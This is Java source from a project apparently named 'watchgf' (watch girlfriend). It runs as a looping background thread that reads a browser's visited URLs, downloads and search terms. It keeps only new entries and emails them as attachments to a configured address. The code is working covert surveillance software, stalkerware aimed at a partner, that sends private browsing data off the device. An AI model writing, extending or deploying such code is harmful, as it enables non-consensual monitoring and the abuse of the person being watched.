package com.github.skyisbule.watchgf;

import cn.hutool.core.io.file.FileReader;
import cn.hutool.core.io.file.FileWriter;
import com.github.skyisbule.watchgf.enty.Downloads;
import com.github.skyisbule.watchgf.enty.Searchs;
import com.github.skyisbule.watchgf.enty.Urls;
import com.github.skyisbule.watchgf.read.Selecter;
import org.simplejavamail.email.Email;
import org.simplejavamail.email.EmailBuilder;
import org.simplejavamail.mailer.Mailer;
import org.simplejavamail.mailer.MailerBuilder;
import org.simplejavamail.mailer.config.TransportStrategy;

import java.util.LinkedList;
import java.util.List;

public class MainThread extends Thread {

    private static void doEmail(byte[] url,byte[] download,byte[] search){
        Mailer mailer = MailerBuilder
                .withSMTPServer(Config.SMTP_SERVER, Config.SMTP_PROT, Config.SMTP_USER,Config.SMTP_AUTH_CODE)
                .withTransportStrategy(TransportStrategy.SMTPS)
                .clearEmailAddressCriteria()
                .buildMailer();
        Email mail = EmailBuilder.startingBlank()
                .from(Config.EMAIL_FROM)
                .to("skyisbule",Config.EMAIL_TO)
                .withSubject("sky-监控浏览记录")
                .withHTMLText("<p>监控结果如附件所示</p>")
                .withAttachment("浏览记录.txt",url,"plain/text")
                .withAttachment("下载记录.txt",download,"plain/text")
                .withAttachment("搜索记录.txt",search,"plain/text")
                .buildEmail();
        mailer.sendMail(mail);
    }

    private void doWrite(String type,List res){
        String fileName = "sky-"+type+".txt";
        FileWriter writer = new FileWriter(Config.WRITE_FILE_PATH+fileName);
        StringBuilder result = new StringBuilder();
        for (Object url : res) {
            result.append(url.toString());
        }
        writer.write(result.toString());
    }

    @SuppressWarnings("unchecked")
    public void run(){
        while(true) {
            List<Searchs> searchsOldList = getSearchs();
            List<Downloads> downloadOldList = getDownloads();
            List<Urls> urlsOldList = getUrls();
            //读db  把结果写入文件
            Selecter selecter = new Selecter();
            List urlsNewList = selecter.getUrls(Config.URL_COUNT);
            urlsNewList.removeAll(urlsOldList);//去掉以前的
            this.doWrite("urls", urlsNewList);
            List dowNewList = selecter.downloads(Config.DOWNLOAD_COUNT);
            dowNewList.removeAll(downloadOldList);//去掉以前的
            this.doWrite("downloads", dowNewList);
            List secNewList = selecter.searchs(Config.SEARCH_COUNT);
            secNewList.removeAll(searchsOldList);//去掉以前的
            this.doWrite("searchs", secNewList);
            //发送邮件
            doEmail(list2byte(urlsNewList), list2byte(dowNewList), list2byte(secNewList));
            try {
                Thread.sleep(Config.SLEEP_TIME);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private byte[] list2byte(List list){
        StringBuilder res = new StringBuilder();
        for (Object o : list) {
            res.append(o.toString());
        }
        return res.toString().getBytes();
    }

    private List getSearchs(){
        FileReader secReader = new FileReader(Config.WRITE_FILE_PATH+"sky-searchs.txt");
        String result = secReader.readString();
        List<Searchs> list = new LinkedList<>();
        for (String str : result.split("\n")){
            String[] obj = str.split(" ");
            Searchs search = new Searchs();
            search.setUrlId(Integer.valueOf(obj[0]));
            search.setTerm(obj[1]);
            list.add(search);
        }
        return list;
    }

    private List getDownloads(){
        FileReader dowReader = new FileReader(Config.WRITE_FILE_PATH+"sky-downloads.txt");
        String result = dowReader.readString();
        List<Downloads> list = new LinkedList<>();
        for (String str : result.split("\n")){
            String[] obj = str.split(" ");
            Downloads download = new Downloads();
            download.setId(Integer.valueOf(obj[0]));
            download.setCurrent_path(obj[1]);
            download.setReferrer(obj[2]);
            download.setTotal_bytes(Integer.valueOf(obj[3]));
            list.add(download);
        }
        return list;
    }

    private List getUrls(){
        FileReader urlReader = new FileReader(Config.WRITE_FILE_PATH+"sky-urls.txt");
        String result = urlReader.readString();
        List<Urls> list = new LinkedList<>();
        for (String str : result.split("\n")){
            String[] obj = str.split(" ");
            Urls url = new Urls();
            url.setUid(Integer.valueOf(obj[0]));
            url.setUrl(obj[1]);
            url.setTitle(obj[2]);
            url.setVisit_count(Integer.valueOf(obj[3]));
            list.add(url);
        }
        return list;
    }

}
